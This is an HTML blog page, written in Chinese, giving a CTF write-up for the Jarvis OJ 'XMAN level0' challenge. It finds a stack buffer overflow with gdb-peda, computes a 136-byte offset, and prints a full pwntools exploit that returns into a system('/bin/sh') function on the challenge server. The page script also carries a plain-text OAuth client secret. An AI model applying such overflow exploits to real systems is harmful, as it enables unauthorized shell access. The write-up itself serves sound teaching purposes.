@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.0.4" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico?v=6.0.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico?v=6.0.4">
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.0.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  
+  <meta name="keywords" content="PWN,StackOverFlow,XMAN,Linux," />
+
+
+<meta name="description" content="在 Jarvis OJ 平台上发现的一个 pwn 题目系列：XMAN。本篇介绍 XMAN level0.">
+<meta name="keywords" content="PWN,StackOverFlow,XMAN,Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XMAN-level0">
+<meta property="og:url" content="http://blog.evilnull.com/2018/02/28/XMAN-level0/index.html">
+<meta property="og:site_name" content="evilnull">
+<meta property="og:description" content="在 Jarvis OJ 平台上发现的一个 pwn 题目系列：XMAN。本篇介绍 XMAN level0.">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-03-01T15:09:41.850Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XMAN-level0">
+<meta name="twitter:description" content="在 Jarvis OJ 平台上发现的一个 pwn 题目系列：XMAN。本篇介绍 XMAN level0.">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="evilnull" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="http://blog.evilnull.com/2018/02/28/XMAN-level0/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+  <title>XMAN-level0 | evilnull</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">evilnull</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Enjoy coding,enjoy life.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+  
+
+
+
+ </div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://blog.evilnull.com/2018/02/28/XMAN-level0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="evilnull">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="evilnull">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XMAN-level0</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-28T20:49:20+08:00">2018-02-28</time>
+            
+
+            
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a></span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/PWN/StackOverFlow/" itemprop="url" rel="index"><span itemprop="name">StackOverFlow</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/02/28/XMAN-level0/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2018/02/28/XMAN-level0/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在 <a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">Jarvis OJ</a> 平台上发现的一个 pwn 题目系列：XMAN。<br>本篇介绍 XMAN level0.<br><a id="more"></a><br>题目可以在 <a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">Jarvis OJ</a> 平台上找的，这里不再提供下载。</p>
+<p>首先使用 <code>file</code> 命令查看文件</p>
+<pre><code>file level0.b9ded3801d6dd36a97468e128b81a65d  
+level0.b9ded3801d6dd36a97468e128b81a65d: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped
+</code></pre><p>程序是64位 ELF 文件</p>
+<p>使用 <code>checksec</code> 查看文件保护机制 （<a href="https://github.com/longld/peda" target="_blank" rel="noopener">gdb peda插件</a>）</p>
+<pre><code>gdb level0.b9ded3801d6dd36a97468e128b81a65d
+
+gdb-peda$ checksec 
+CANARY    : disabled  
+FORTIFY   : disabled  
+NX        : ENABLED  
+PIE       : disabled  
+RELRO     : disabled  
+</code></pre><p>程序只启用了 NX （栈不可执行）</p>
+<p>用 IDA 分析程序，发现一个函数明显存在缓冲区溢出漏洞</p>
+<pre><code>ssize_t vulnerable_function()
+{
+    char buf; // [sp+0h] [bp-80h]@1
+
+    return read(0, &amp;buf, 0x200uLL);
+}
+</code></pre><p>同时发现一个 callsystem 函数</p>
+<pre><code>int callsystem()
+{
+    return system(&quot;/bin/sh&quot;);
+}
+</code></pre><p>因此只要构造 payload 覆盖返回地址，将程序转到 <code>callsystem</code> 函数处执行，即可得到 shell。</p>
+<p>接下来确定溢出点的位置，使用 pattern 来计算<br>首先生成一串字符串</p>
+<pre><code>gdb-peda$ pattern create 150
+&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;
+</code></pre><p>调试运行程序</p>
+<pre><code>gdb-peda$ run
+Starting program: /home/xxx/pwn/XMAN/level0/level0.b9ded3801d6dd36a97468e128b81a65d 
+Hello, World
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA
+
+Program received signal SIGSEGV, Segmentation fault.
+
+Stopped reason: SIGSEGV
+0x00000000004005c5 in vulnerable_function ()
+</code></pre><p>程序崩溃，出错位置为 0x00000000004005c5，继续使用 pattern 计算溢出点</p>
+<pre><code>gdb-peda$ pattern offset 0x00000000004005c5
+4195781 not found in pattern buffer
+</code></pre><p>pattern 报错，这是因为 linux x64 内存地址的范围为64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。虽然程序不能跳转到那个地址，我们依然可以计算出溢出点。因为 <code>ret</code> 指令相当于 <code>pop rip</code> ，只要查看栈顶的数值就知道程序要跳转的地址。</p>
+<p>  gdb-peda$ x/xg $rsp<br>  0x7fffffffdc78:    0x41416d4141514141</p>
+<p>  gdb-peda$ pattern offset 0x41416d4141514141<br>  4702159612987654465 found at offset: 136</p>
+<p>成功计算出溢出点偏移为136字节，因此设置 payload 为 ‘A’*136+ret 即可  </p>
+<p>此外，可以直接阅读反汇编代码，计算溢出点</p>
+<pre><code>.text:00000000004005A6                 push    rbp
+.text:00000000004005A7                 mov     rbp, rsp
+.text:00000000004005AA                 add     rsp, -80h
+.text:00000000004005AE                 lea     rax, [rbp-80h]
+.text:00000000004005B2                 mov     edx, 200h       ; nbytes
+.text:00000000004005B7                 mov     rsi, rax        ; buf
+.text:00000000004005BA                 mov     edi, 0          ; fd
+.text:00000000004005BF                 call    _read
+.text:00000000004005C4                 leave
+.text:00000000004005C5                 retn
+</code></pre><p>从 vulnerable_function 代码中可以看出，在栈帧中缓冲区在 <code>rbp-80h</code> 处，因此 <code>rbp</code> 相对缓冲区的偏移为 <code>0x80</code>，返回地址的偏移为 <code>0x80+0x8=0x88（136）</code>。</p>
+<p>使用 pwntools 编写 exp</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import sys
+from pwn import *
+
+def main(local=False):
+    if local:
+        context.log_level = &apos;debug&apos;
+        io = process(&apos;./level0.b9ded3801d6dd36a97468e128b81a65d&apos;)
+    else:
+        context.log_level = &apos;info&apos;
+        io = remote(&apos;pwn2.jarvisoj.com&apos;, 9881)
+
+    elf = ELF(&apos;./level0.b9ded3801d6dd36a97468e128b81a65d&apos;)
+    ret = elf.symbols[&apos;callsystem&apos;]
+
+    payload = &apos;A&apos; * 136
+    payload += p64(ret)
+
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == &apos;__main__&apos;:
+    if len(sys.argv) &gt;= 2 and sys.argv[1] == &apos;local&apos;:
+        main(True)
+    else:
+        main()
+</code></pre><p>reference<br><a href="https://jaq.alibaba.com/community/art/show?articleid=403" target="_blank" rel="noopener">一步一步学ROP之linux_x86篇</a><br><a href="https://jaq.alibaba.com/community/art/show?articleid=473" target="_blank" rel="noopener">一步一步学ROP之linux_x64篇</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>evilnull</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://blog.evilnull.com/2018/02/28/XMAN-level0/" title="XMAN-level0">http://blog.evilnull.com/2018/02/28/XMAN-level0/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
+          
+            <a href="/tags/StackOverFlow/" rel="tag"># StackOverFlow</a>
+          
+            <a href="/tags/XMAN/" rel="tag"># XMAN</a>
+          
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/28/repair-ubuntu-uefi-bootloadr/" rel="next" title="记一次修复Ubuntu UEFI引导过程">
+                <i class="fa fa-chevron-left"></i> 记一次修复Ubuntu UEFI引导过程
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/01/XMAN-level1/" rel="prev" title="XMAN-level1">
+                XMAN-level1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">evilnull</p>
+              <p class="site-description motion-element" itemprop="description">A Coder Blog</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/evilnull" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:evilnull@outlook.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2015 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">evilnull</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/theme-next/hexo-theme-next">NexT.Muse</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.0.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.0.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.0.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.0.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.0.4"></script>
+
+
+
+  
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
+        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: window.location.pathname,
+            owner: 'evilnull',
+            repo: 'blog.comments',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: '1308a9935cf592d82be2c66d1dbd568372833885',
+            
+                client_id: 'e00281fe9eb20bbfe032'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
